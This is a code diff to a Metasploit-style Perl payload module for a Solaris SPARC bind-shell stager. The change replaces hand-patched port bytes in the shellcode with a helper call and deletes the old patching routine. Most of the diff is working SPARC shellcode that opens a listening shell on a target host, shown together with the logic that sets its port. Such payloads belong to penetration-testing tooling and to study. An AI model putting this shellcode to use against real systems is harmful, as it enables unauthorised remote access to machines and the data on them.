@@ -1,5 +1,6 @@
 package Msf::PayloadComponent::SolarisBindStager;
 use strict;
+use Pex::SPARC;
 use base 'Msf::PayloadComponent::SolarisPayload';
 sub load {
   Msf::PayloadComponent::SolarisPayload->import('Msf::PayloadComponent::BindConnection');
@@ -27,6 +28,8 @@ sub new {
 
 sub SolarisPayload {
     my $self = shift;
+    my $port = $self->GetVar('LPORT');
+
     my $hash = {
         Payload =>
             "\x90\x10\x20\x02".     # mov          2, %o0
@@ -36,8 +39,9 @@ sub SolarisPayload {
             "\x98\x10\x20\x01".     # mov          1, %o4
             "\x82\x10\x20\xe6".     # mov          230, %g1
             "\x91\xd0\x20\x08".     # ta           0x8
-            "\x2d\x0c\xc0\x90".     # sethi        %hi(0x33024000), %l6
-            "\xac\x15\xa1\x41".     # or           %l6, 0x141, %l6 ! 0x33024141
+	    Pex::SPARC::set((0x33020000 | $port) ^ 4095, "l6").
+#            "\x2d\x0c\xc0\x90".     # sethi        %hi(0x33024000), %l6
+#            "\xac\x15\xa1\x41".     # or           %l6, 0x141, %l6 ! 0x33024141
             "\xac\x1d\xaf\xff".     # xor          %l6, 4095, %l6
             "\xae\x02\x3f\xff".     # add          %o0, -1, %l7
             "\xc0\x23\xbf\xec".     # st           %g0, [%sp - 20]
@@ -64,20 +68,6 @@ sub SolarisPayload {
             "\x9f\xc3\xbf\xe8".     # jmpl         %sp - 24, %o7
             "\xac\x1d\x80\x16",     # xor          %l6, %l6,%l6
     };
-    
-    my $lport  = unpack('N', pack('nn', 0x3302, $self->GetVar('LPORT') ^ 4095));
-    
-    # Extract
-    my $hiData = unpack('N', substr($hash->{'Payload'}, 28, 4));
-    my $loData = unpack('N', substr($hash->{'Payload'}, 32, 4));
-
-    # Patch
-    $hiData = (($hiData >> 22) << 22) + ($lport >> 10);
-    $loData = (($loData >> 10) << 10) + (($lport << 22) >> 22);
-
-    # Replace
-    substr($hash->{'Payload'}, 28, 4, pack('N', $hiData));
-    substr($hash->{'Payload'}, 32, 4, pack('N', $loData));
     
     return($hash);
 }
